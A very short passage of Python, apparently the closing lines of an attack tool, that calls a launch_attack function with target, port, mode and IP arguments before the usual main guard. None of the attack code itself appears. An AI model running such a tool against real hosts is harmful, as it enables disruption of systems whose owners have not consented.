    launch_attack(target, port, attack_mode, is_ip)

if __name__ == "__main__":
    main()
